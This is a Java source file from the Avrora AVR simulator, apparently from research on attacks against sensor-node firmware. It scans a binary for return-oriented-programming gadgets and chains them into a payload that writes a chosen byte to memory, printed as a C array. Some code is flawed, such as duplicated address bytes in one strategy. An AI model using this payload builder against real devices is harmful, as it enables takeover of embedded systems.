/**
 * Copyright (c) 2004-2005, Regents of the University of California
 * All rights reserved.
 *
 * Redistribution and use in source and binary forms, with or without
 * modification, are permitted provided that the following conditions
 * are met:
 *
 * Redistributions of source code must retain the above copyright notice,
 * this list of conditions and the following disclaimer.
 *
 * Redistributions in binary form must reproduce the above copyright
 * notice, this list of conditions and the following disclaimer in the
 * documentation and/or other materials provided with the distribution.
 *
 * Neither the name of the University of California, Los Angeles nor the
 * names of its contributors may be used to endorse or promote products
 * derived from this software without specific prior written permission.
 *
 * THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS
 * "AS IS" AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT
 * LIMITED TO, THE IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR
 * A PARTICULAR PURPOSE ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT
 * OWNER OR CONTRIBUTORS BE LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL,
 * SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT
 * LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR SERVICES; LOSS OF USE,
 * DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER CAUSED AND ON ANY
 * THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY, OR TORT
 * (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
 * OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.
 */

package avrora.actions;

import java.io.FileInputStream;
import java.io.IOException;
import java.util.ArrayList;
import java.util.Iterator;
import java.util.Map;
import java.util.Stack;

import avrora.Defaults;
import avrora.Main;
import avrora.arch.AbstractDisassembler;
import avrora.arch.AbstractInstr;
import avrora.arch.legacy.LegacyInstr;
import avrora.core.Program;
import avrora.core.ProgramReader;
import cck.text.StringUtil;
import cck.text.Terminal;
import cck.util.Arithmetic;
import cck.util.Option;
import cck.util.Util;


/**
 * The <code>FindGadgetsAction</code> class represents an action that allows the user to disassemble
 * a binary file and Lookup the postential "gadgets" found in the code ....
 *
 * @author Ben L. Titzer, 
 * @author A. Francillon
 */
public class FindGadgetsAction extends Action {

    Option.Str ARCH = newOption("arch", "avr",
    "This option selects the architecture for the disassembler.");
    Option.Long MAX_LENGTH = newOption("max-length", 16,
    "This option specifies the maximum length of an instruction in bytes.");
    Option.Str FILE = newOption("file", "",
            "When this option is specified, this action will test the disassembler by loading the " +
    "specified file and disassembling the data contained inside.");

    public FindGadgetsAction() {
        super("The \"findgadgets\" action disassembles a binary file into source level instructions"+
        " and searches for specificassembly sequences");
    }

    GadgetsSet gadgets;
    AbstractDisassembler da;


    /**
     * The <code>run()</code> method executes the action. The arguments on the command line are passed.
     * The <code>Disassemble</code> action expects the first argument to be the name of the file to
     * disassemble.
     * @param args the command line arguments
     * @throws Exception if there is a problem reading the file or disassembling the instructions in the
     * file
     */
    public void run(String[] args) throws Exception {
        Byte[] buf;

        //AbstractArchitecture arch = ArchitectureRegistry.getArchitecture(ARCH.get());
        //da = arch.getDisassembler();
        if ( FILE.isBlank() ) {
            throw new Exception("File not found ");
        }
        // load and lookup a file for gadgets
        Terminal.println("searching for gadgets in file "+ FILE.get());
        gadgets= findGadgets();
        //gadgets.print();
        
        // write Byte 0x0A to address 0x0190
        buf=createShellCodeInjectByteToMemory((byte)10,400);           
        PrintPayload(buf);
        // inject payload ?    
        
            
    }
 
    /**
     * CreateShellCodeInjectByteToMemory builds a shell code 
     * it for current program
     * @return a byte array containing the shellcode 
     * @throws Exception 
     */
    @SuppressWarnings("unchecked")
    public Byte[] createShellCodeInjectByteToMemory(byte value, Integer address) 
        throws LegacyInstr.InvalidImmediate {
     
        Byte[] payload1 =null;
        Byte[] payload2 =null;
        Byte[] payload3 =null;
        
        payload1 = createShellCodeInjectByteToMemory_strategy1(value,address);

        payload2 = createShellCodeInjectByteToMemory_strategy2(value,address);
        
        payload3 = createShellCodeInjectByteToMemory_strategy3(value,address);
              

//        Terminal.println("Strategy 1:");
//        PrintPayload(payload1);
//        Terminal.println("Strategy 2:");
//        PrintPayload(payload2);
//        Terminal.println("Strategy 3:");
//        PrintPayload(payload3);
//        
        if (payload3.length< payload1.length
                && payload3.length< payload2.length)
             return payload3;
        if (payload2.length< payload1.length
                && payload2.length< payload3.length)
             return payload2;
        else 
            return payload1;
        
    }
    

        
//    
//    private Byte[] createShellCodeInjectByteToMemory_strategy_memcpy(byte value, Integer address) {
//  
//            
//        return null;
//    }

    /**
     * CreateShellCodeInjectByteToMemory builds a shell code 
     * it for current program
     * @return a byte array containing the shellcode 
     * @throws Exception 
     */
    @SuppressWarnings("unchecked")
    public Object[] createShellCodeLD(Integer dataReg, Integer addrReg  ) 
           throws LegacyInstr.InvalidImmediate {
        
        Stack<Byte> payload=new Stack<Byte> ();        
        
        Terminal.println("adding ret to 0x0000 ");
        addFakeRebootToPayload(payload);
        // strategy 1:
        // - copy address from stack to reg with a pop
        // - copy value from stack to reg with a pop
        // - copy from reg to memory with ld 
        
        
        // step 1 find shortests ld gadgets 
        GadgetsSet stGadgets=gadgetsWithInstr(gadgets,LegacyInstr.ST.class, null);
        //Terminal.println("found gadgets "); stGadgets.print();
        Gadget smallSt=stGadgets.smallest();
        Terminal.println("smallest ST gadget"); smallSt.print();
        
        Terminal.println("adding ret to ld at address "
                    +StringUtil.to0xHex(smallSt.entryPointAddr(), 4));
                
        addAddressToPayload(payload,smallSt.entryPointAddr());
        
        
        LegacyInstr.ST st=(LegacyInstr.ST)smallSt.get((smallSt.firstKey()));
        dataReg= st.r2.getNumber();
        addrReg= st.r1.getNumber();
        Terminal.println("data reg = "+dataReg + " Addrreg "+addrReg);
        Object[] tmp =new Object[3];
        tmp[0]=payload;
        tmp[1]=dataReg;
        tmp[2]=addrReg;        
        return tmp; 
    }
          
    /**
     * CreateShellCodeInjectByteToMemory builds a shell code 
     * it for current program
     * @return a byte array containing the shellcode 
     * @throws Exception 
     */
    @SuppressWarnings("unchecked")
    public Byte[] createShellCodeInjectByteToMemory_strategy1(byte value, Integer address) throws LegacyInstr.InvalidImmediate {
            
        Integer dataReg=null;
        Integer addrReg=null;
        Object[] tmp;
        Stack<Byte> payload;
        Terminal.println("======== Strategy 1 ==========");
        
        tmp=createShellCodeLD(dataReg,addrReg);
        payload=(Stack<Byte>)tmp[0];
        dataReg=(Integer) tmp[1];
        addrReg=(Integer) tmp[2];
        
        Terminal.println("addrReg="+addrReg+" datareg="+dataReg);
        
        // A set of features required for this gadget 
        // features are a hash map where key is the register and object 
        // is the class of the instruction
        ArrayList<Feature> features =  new ArrayList<Feature>();
        features.add(new Feature(LegacyInstr.POP.class,dataReg,value));
        features.add(new Feature(LegacyInstr.POP.class,addrReg,Arithmetic.low(address)));
        features.add(new Feature(LegacyInstr.POP.class,addrReg+1,Arithmetic.high(address)));
        
        
        // loading from stack to registers look for the shortest gadget doing 
        // all that in once 
        Terminal.println("smallest gadget with pop r"+addrReg+":"+(addrReg+1)+", and r"+dataReg);        
        findGadgets();
        
        GadgetsSet commongadgets=gadgets.filterGadgets(features);
        Terminal.println("gadgets with pop r"+(addrReg+1)+" and pop r"+addrReg+" and pop r"+dataReg);
        //commongadgets.print();
        if(commongadgets.size()!=0){
            Terminal.println("smallest");
            Gadget candidategadget_strategy1= commongadgets.smallestStackSize();
            candidategadget_strategy1.print();
            
            // adding this result to the stack 
            addGadgetToPayload(payload,candidategadget_strategy1,features);
            
            // return byte array of the stack
            //Byte array[]=new Byte[payload_strategy1.size()];
            //array=reverseStack(payload_strategy1).toArray(array);
            Terminal.println("Strategy 1 got payload of length "+payload.size());
    
            //return array;            
            
            return payloadToByteArray(payload);
//            return array;
          
        }else{
            Terminal.println("Strategy 1  found nothing interesting ...");
            return null;
        }   
    }
    

    private Byte[] payloadToByteArray(Stack<Byte> payload) {
        Byte array[]=new Byte[payload.size()];
        array= reverseStack(payload).toArray(array);
        return array;
    }

    /**
     * CreateShellCodeInjectByteToMemory builds a shell code 
     * it for current program
     * Strategy 3 try to find a gadget to copy some lower register to Z 
     * Expect that chaining pop rx , movw Z rx is "cheaper" than pop Z 
     * @return a byte array containing the shellcode 
     * @throws Exception 
     */
    @SuppressWarnings("unchecked")
    public Byte[] createShellCodeInjectByteToMemory_strategy3(byte value, Integer address) throws LegacyInstr.InvalidImmediate {
        Stack<Byte> payload;
        Integer dataReg=null;
        Integer addrReg=null;
        
        
        Terminal.println("======== Strategy 3 ==========");
          // that's so ugly ...
        Object[] tmp=createShellCodeLD(dataReg,addrReg);
        payload=(Stack<Byte>)tmp[0];
        dataReg=(Integer) tmp[1];
        addrReg=(Integer) tmp[2];
        
        //              find possible Addrreg pop ?
        Terminal.println("smallest gadget with pop r"+addrReg+":"+(addrReg+1));     
        
        //      a feature to movw to Z
        ArrayList<Feature> features_movw= new ArrayList<Feature>() ;
//        features_movw.add(new Feature(LegacyInstr.MOVW.class,addrReg+1,null));
        features_movw.add(new Feature(LegacyInstr.MOVW.class,addrReg));
        GadgetsSet movw_gadgets=gadgets.filterGadgets(features_movw);
        //gadgets.print();
        movw_gadgets=movw_gadgets.excludeGadgetsWithCall();
        
        Gadget candidate = movw_gadgets.smallestStackSize();
        candidate.print();
        
        // find a gadget to pop values on stack to registers for movw
        Integer movw_src_reg=((LegacyInstr.MOVW)candidate.get(candidate.firstKey())).r2.getNumber();
        ArrayList<Feature> features_pop_reg_for_movw= new ArrayList<Feature>() ;
        features_pop_reg_for_movw.add(new Feature(LegacyInstr.POP.class,movw_src_reg,Arithmetic.low(address)));
        features_pop_reg_for_movw.add(new Feature(LegacyInstr.POP.class,movw_src_reg+1,Arithmetic.high(address)));

        GadgetsSet pop_reg_for_movw_gadgets=gadgets.filterGadgets(features_pop_reg_for_movw);
        pop_reg_for_movw_gadgets=pop_reg_for_movw_gadgets.excludeGadgetsWithCall();

        // do this just before calling st such that we reduce the 
        // chances to corrupt register 
        ArrayList<Feature> features_dataReg =  new ArrayList<Feature>();
        features_dataReg.add(new Feature(LegacyInstr.POP.class,dataReg,value));
        GadgetsSet pop_dataReg=gadgets.filterGadgets(features_dataReg);
        
        Terminal.println("find a gadget to pop values on stack to registers for movw");
        pop_reg_for_movw_gadgets.smallestStackSize().print();
        
        addGadgetToPayload(payload,pop_dataReg.smallestStackSize(),features_dataReg);
        addGadgetToPayload(payload,pop_reg_for_movw_gadgets.smallestStackSize(),features_pop_reg_for_movw);
        
        return payloadToByteArray(payload);
        
    }
    
    
    /**
     * CreateShellCodeInjectByteToMemory builds a shell code 
     * it for current program
     * @return a byte array containing the shellcode 
     * @throws Exception 
     */
    @SuppressWarnings("unchecked")
    public Byte[] createShellCodeInjectByteToMemory_strategy2(byte value, Integer address) throws LegacyInstr.InvalidImmediate {
        Stack<Byte> payload;
        Integer dataReg=null;
        Integer addrReg=null;
        Terminal.println("======== Strategy 2 ==========");
        
        // that's so ugly ...
        Object[] tmp=createShellCodeLD(dataReg,addrReg);
        payload=(Stack<Byte>)tmp[0];
        dataReg=(Integer) tmp[1];
        addrReg=(Integer) tmp[2];
        //              find possible Addrreg pop ?
        Terminal.println("smallest gadget with pop r"+addrReg+":"+(addrReg+1));

        // a feature to pop address  Registers
        ArrayList<Feature> features_addr= new ArrayList<Feature>() ;
        features_addr.add(new Feature(LegacyInstr.POP.class,addrReg+1,Arithmetic.low(address)));
        features_addr.add(new Feature(LegacyInstr.POP.class,addrReg,Arithmetic.low(address)));
        
        GadgetsSet popAddrGadgets=gadgets.filterGadgets(features_addr);

        // a feature to pop data Reg 
        ArrayList<Feature> features_data= new ArrayList<Feature>() ;
        features_data.add(new Feature(LegacyInstr.POP.class,dataReg,value));
        // filter ou the gadgets 
        GadgetsSet popDataGadgets=gadgets.filterGadgets(features_data);
        
        if(!popAddrGadgets.isEmpty() && !popDataGadgets.isEmpty()){
            Terminal.println(" we found some candidates ... ");
            Terminal.println(" to pop addr reg : ... ");
            popAddrGadgets.smallest().print();
            Terminal.println(" to pop data reg : ... ");
            popDataGadgets.smallest().print();
            addGadgetToPayload(payload, popAddrGadgets.smallest(), features_addr);
            addGadgetToPayload(payload, popDataGadgets.smallest(), features_data);
            return payloadToByteArray(payload);
        }
        return null;

    }
    
    class Feature {
        //LegacyInstr instr;
        Class instruction=null;
//        Class not_instruction=null;
        Integer register1=null;
        Integer register2=null;
        Byte val1=null;
        Byte val2=null;

//        Feature(Class instruction,boolean match){
//            if (match)
//                this.instruction=instruction;
//            else    
//                this.not_instruction=instruction;
//        }
        Feature(Class instruction,Integer register){
            this.instruction=instruction;
            this.register1=register;
        }
        Feature(Class instruction,Integer register,byte val1){
            this.instruction=instruction;
            this.register1=register;
            this.val1=val1;
        }
        Feature(Class instruction,Integer register1, byte val1,
                Integer register2, byte val2){
            this.instruction=instruction;
            this.register1=register1;
            this.val1=val1;
            this.register2=register2;
            this.val2=val2;
        }

        /**
         * check if <code>instructionToMatch</code> and feature are matching
         * 
         * @return Object of the match i.e. type of instruction, <code>null</code> if no match
         */
        
        boolean matches(LegacyInstr instructionToMatch){
//            // matching a not rule
//            if(instruction==null && not_instruction!=null)
//                return !not_instruction.isInstance(instructionToMatch);
//            
            if(!instruction.isInstance(instructionToMatch))
                return false;
            // same instruction let's see if register match 
            if(instructionToMatch instanceof LegacyInstr.POP){
                LegacyInstr.POP instr=(LegacyInstr.POP)instructionToMatch;
                if (instr.r1.getNumber()==this.register1)
                    // ok we found instruction
                    return true;
                else 
                    // this is not a needed instruction
                    return false;
            }
            Terminal.println("handling of class "+instructionToMatch.getClass().getCanonicalName()+"not implemented " );
            // well default ...
            return false;
            
        }
    }
    
    
    private void addGadgetToPayload(Stack<Byte> payload, 
            Gadget candidategadget, 
            ArrayList<Feature> origFeatures) throws LegacyInstr.InvalidImmediate{
        ArrayList<Feature> features=origFeatures;
        Iterator i=candidategadget.reverseIterator();
        // We are going to look at all the instrucitons of the gadget
        // in reverse order as the last instr is the one who matters 
        // (i.e. in code with pop r1,  pop r1 we want the last pop to load r1 ) 
        // also the paload is goning to be executed in reverse order 
        // by now all of them should be keept
        while(i.hasNext()){
            Map.Entry entry= (Map.Entry)i.next() ;
            LegacyInstr gadgetInstr=(LegacyInstr)entry.getValue();
            applyFeature(payload, features, gadgetInstr);
        }        
        // finally the address to call the gadget 
        Terminal.println("adding address to candidate "
                +StringUtil.to0xHex(candidategadget.entryPointAddr(), 4));
        candidategadget.print();
        addAddressToPayload(payload, candidategadget.entryPointAddr());
    }


    /**
     *  Should be a visitor ?
     * @return true if feature has been applied
     */
    public void applyFeature(Stack<Byte> stack,ArrayList<Feature> features,LegacyInstr instr){
        //  if this instruction matches one in features 
        Iterator<Feature> iterFeatures=features.iterator();
        while(iterFeatures.hasNext()){
            Feature f= iterFeatures.next();
            if(f.matches(instr)){
                // so bad that it's almost not working ...
                //Terminal.println("adding parameter in stack "+StringUtil.to0xHex(f.val1, 2));
                stack.add(f.val1);
                // we are done with this one ... 
                iterFeatures.remove();
                // TODO make this clean ... 
                return ;
            }
        }
        // well we didn't match any feature, then question is do we need to add crap to the stack ?

        if (instr instanceof LegacyInstr.POP) {
            // we don't care of this value 
            //Terminal.println("adding random parameter in stack 00");
            stack.add((byte)0);
        }
        else if (instr instanceof LegacyInstr.OUT) {
            // nothing to do, instruction don't touch stack
        }
        else if (instr instanceof LegacyInstr.CALL || instr instanceof LegacyInstr.ICALL
                || instr instanceof LegacyInstr.BRBC|| instr instanceof LegacyInstr.BRBC) {
            Terminal.printCyan("instr "+instr.properties.name+" is your gadget valid ?\n" );
        }
//        else 
//            Terminal.println("instruction is neither in features nor a pop... adopt ignore strategy...");
    }

    /**
     *last step is to reboot the node those two bytes 
     * will be eaten by last ret 
     * @param payload 
     * @throws Exception 
     */
    private void addFakeRebootToPayload(Stack<Byte> payload) {
        try{
            addAddressToPayload(payload, new Integer(0));
        }catch (Exception e) {
            Terminal.print("that should never hapopen");
            e.printStackTrace();
        }
    }





    private void addAddressToPayload(Stack<Byte> payload, Integer addr) throws LegacyInstr.InvalidImmediate{
        
        addAddressToPayload(payload,toBytes(addr));
       
    }

    private void addAddressToPayload(Stack<Byte> payload, Byte[] addr ) throws LegacyInstr.InvalidImmediate{
        if(addr.length>2)
            throw new LegacyInstr.InvalidImmediate(1, addr[0]+255*addr[1],  0, 65536);  
        // TODO check endianess ....
        payload.push(addr[1]);
        payload.push(addr[0]);
        
    }




    private Byte[] toBytes(Integer integer) throws LegacyInstr.InvalidImmediate {
        Byte[] byteaddr=new Byte[2];
        //Terminal.println("to Byes "+integer);
        //Terminal.print("converting Integer "+StringUtil.to0xHex(integer, 4));
        if(integer > 65536)
            throw new LegacyInstr.InvalidImmediate(1, integer,  0, 65536);
        
        byteaddr[0]=Arithmetic.low(integer);
        byteaddr[1]=Arithmetic.high(integer);
        //Terminal.println(" to bytes"+StringUtil.to0xHex(byteaddr[0],2)+ 
        //        " and "+StringUtil.to0xHex(byteaddr[1],2));
        
        return byteaddr;
    }

    

    private GadgetsSet gadgetsWithInstr(GadgetsSet gadgets,Class instr,Integer register){
        GadgetsSet result= new GadgetsSet();

        Iterator<Gadget> i= gadgets.iterator();        
        while(i.hasNext()){
            Gadget g=gadgets.nextGadget(i);
            Integer pos=g.hasInstr(instr,register);
            if(pos!=null){
                //Terminal.println("gadget match at pos "+pos);
               //g.print();
                Gadget newG= new Gadget(g,pos);
                result.addGadget(newG);               
            }
        }
        return result; 
    }
    
    
    GadgetsSet findGadgetsPopR(int reg,GadgetsSet gadgets){        
        
        return gadgetsWithPop(gadgets,reg);
    } 
    
    /**
     * <code>findGadgetsPopr</code> seraches for all gadgets providing the instruction pop rx
     * 
     * @param reg the register poped by the gadget 
     */
    void findGadgetsPopR(int reg){        
        GadgetsSet popgadgetsr = gadgetsWithPop(gadgets,reg);
        Terminal.println("there are "+ popgadgetsr.size() + " gadgets with pop r"+reg+" instr" );
        //popgadgetsr.print();
    }
    
    @SuppressWarnings("unused")
    private GadgetsSet gadgetsWithPop(GadgetsSet gadgets){
        return gadgetsWithPop(gadgets, null);
    }
    
    private GadgetsSet gadgetsWithPop(GadgetsSet gadgets,int reg){
        return gadgetsWithPop(gadgets, new Integer(reg));
    }
    
    private GadgetsSet gadgetsWithPop(GadgetsSet gadgets,Integer register){
        GadgetsSet result= new GadgetsSet();

        Iterator<Gadget>  i= gadgets.iterator();
        
        while(i.hasNext()){
            Gadget g=gadgets.nextGadget(i);
            if(null!=g.hasPop(register)){
                result.addGadget(g);
            }
        }
        return result; 
    }    
    @SuppressWarnings("unused")
    private void disassembleArguments(String[] args, byte[] buf) {
        Terminal.println("running Lookup with arguments :"+args+"\n");
        if ( args.length < 1 )
            Util.userError("no input data");

        for ( int cntr = 0; cntr < args.length; cntr++ ) {
            buf[cntr] = (byte)StringUtil.evaluateIntegerLiteral(args[cntr]);
        }

        disassembleAndPrint(buf, 0);
    }

    @SuppressWarnings("unused")
    private void disassembleFile() throws IOException {
        String fname = FILE.get();
        Main.checkFileExists(fname);
        FileInputStream fis = new FileInputStream(fname);
        byte[] buf = new byte[fis.available()];
        fis.read(buf);
        for ( int cntr = 0; cntr < buf.length; ) {
            cntr += disassembleAndPrint(buf, cntr);  
        }
    }

    private GadgetsSet findGadgets() {
        GadgetsSet gadgets=new GadgetsSet();

         int gadgestadded=0;    
     
        String fname = FILE.get();
        String args[]= new String[1];
        args[0]=fname;
        
        ProgramReader reader=new Defaults.AutoProgramReader();
        Program program;
        try {
            program = reader.read(args);
        } catch (Exception e) {
            // TODO Auto-generated catch block
            Terminal.println("failed to read program " + FILE.get());
            e.printStackTrace();
            return null;
        }
        int lastret=0;
        // starting direct from flash_data as we don't care it a section is marked as 
        // executable or not ... we just can execute them is we find interesting 
        // gadgets in there ...    
        for ( int retAddress = program.program_start; retAddress < program.program_end; ) {
            try{
                AbstractInstr instr = program.disassembleInstr(retAddress);                
            
                retAddress=retAddress+2;
                if( (instr instanceof LegacyInstr.RET ) || (instr instanceof LegacyInstr.RETI)){
//                    Terminal.println("at addr"+StringUtil.to0xHex(cntr, 4)+" "
//                                    +instr.toString());
                    int from=retAddress-60;
                    if(lastret>from)
                        from=lastret;
                    Gadget newGadget=createGadget(program, from, retAddress);
                    gadgets.addGadget(newGadget);
                    lastret=retAddress;
                    //newGadget.print();
                    gadgestadded++;
                }
            }
            catch(Exception i){
               i.printStackTrace();
            }
        }
        //Terminal.println("Found "+gadgestadded+" gadgets ;  gadgets.size()=="+ gadgets.size());
        return gadgets;
    }


    @SuppressWarnings("unused")
    private Gadget createGadget(byte[] buf,int from , int to) throws IOException {
        Gadget currGadget=new Gadget(to);
        int len = 2;

        for ( int addr = from; addr < buf.length && addr < to  ; ) {
            AbstractInstr instr=da.disassemble(0, addr, buf);

            if ( instr != null )
                len = instr.getSize();
            else
                len=2;

            currGadget.addInstr(new Integer(addr), instr);
            addr+=len;
        }
        return currGadget;
    }

    private Gadget createGadget(Program p,int from , int to) throws IOException {
        Gadget currGadget=new Gadget(to);
        //Terminal.println("created a gadget to addr " +to);
        int len = 2;

        for ( int addr = from; addr < p.program_end && addr < to  ; ) {
            AbstractInstr instr=p.disassembleInstr(addr);

            if ( instr != null )
                len = instr.getSize();
            else
                len=2;

            currGadget.addInstr(new Integer(addr), instr);
            addr+=len;
        }
        return currGadget;
    }



    @SuppressWarnings("unused")
    private void disassembleBytes(byte[] buf,int from , int to) throws IOException {

        Terminal.println("=============");
        for ( int cntr = from; cntr < buf.length && cntr < to  ; ) {
            cntr += disassembleAndPrint(buf, cntr);  
        }

        Terminal.println("=============");
    }

    private int disassembleAndPrint(byte[] buf, int off) {
        String result;
        int len = 2;
        AbstractInstr instr = da.disassemble(0, off, buf);
        if ( instr == null ) result = "null";
        else {
            result = instr.toString();
            len = instr.getSize();
        }
        print(buf, off, len, result);
        return len;
    }

    
    public static <T> Stack<T> reverseStack(Stack<T> in){
        Stack<T> out=new Stack<T>();
        while(!in.empty()){
            out.push(in.pop());
        }
        return out;
    }
/** 
 * Print a C shapped array containing payload 
 * @param buf
 */

    private void PrintPayload(Byte[] buf) {
        if (buf==null){
            Terminal.println("//none");
            return;
        }
              
        Terminal.println("uint8_t payload_length="+buf.length+";");
        Terminal.print("payload={");
        for(int i=0; i<buf.length;i++){
            Terminal.print(StringUtil.to0xHex(buf[i], 2));
            if (i<buf.length-1)
                    Terminal.print(",");
        }
        Terminal.println("};");
    }
    private static void print(byte[] buf, int off, int len, String str) {
        StringBuffer sbuf = new StringBuffer();
        sbuf.append(StringUtil.addrToString(off));
        sbuf.append(": ");
        for ( int cntr = 0; cntr < len; cntr++ ) {
            StringUtil.toHex(sbuf, buf[off+cntr], 2);
            sbuf.append(' ');
        }
        for ( int cntr = sbuf.length(); cntr < 30; cntr++ ) sbuf.append(' ');
        sbuf.append(str);
        Terminal.println(sbuf.toString());
    }
}
